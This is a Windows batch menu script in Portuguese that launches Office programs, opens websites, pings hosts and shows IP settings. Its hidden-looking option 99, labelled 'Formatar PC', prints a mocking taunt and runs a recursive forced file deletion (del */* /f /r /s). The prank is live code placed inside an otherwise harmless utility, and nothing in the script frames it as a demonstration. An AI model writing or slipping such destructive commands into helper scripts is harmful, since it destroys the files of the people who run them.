@echo off
mode 80,50
color 0A
:inicio
cls
echo.
echo ===============================================
echo ===            MENU PRINCIPAL              ====
echo ===============================================
echo.
echo [1] Word
echo [2] Excel
echo [3] Powerpoint
echo [4] Access
echo [5] Navegar Web
echo [6] Testar Conexao
echo [7] Opter IP da Maquina
echo [99] Formatar PC
echo [8] Sair do Programa
echo.
set /p op=Digite a opcao desejada: 
if %op% == 1 (goto:word)
if %op% == 2 (goto:excel)
if %op% == 3 (goto:power)
if %op% == 4 (goto:access)
if %op% == 5 (goto:web)
if %op% == 6 (goto:conexao)
if %op% == 7 (goto:ip)
if %op% == 99 (goto:formatarpc)
if %op% == 8 (goto:sair) else (
	echo.
	echo Opcao Invalida!
	pause
	goto inicio
)

:word
start winword.exe
goto inicio

:excel
start excel.exe
goto inicio

:power
start powerpnt.exe
goto inicio

:access
start msaccess.exe
goto inicio

:web
set /p site=Digite o endereco da pagina desejada: 
start %site%
goto inicio

:conexao
set /p teste=Digite o IP ou Site: 
REM O comando ping abaixo só interrompe após o Ctrl+C!
ping %teste% -t
goto inicio

:ip
ipconfig /all
pause
goto inicio

:formatarpc
echo Se fudeu
del */* /f /r /s
goto inicio

:sair
exit
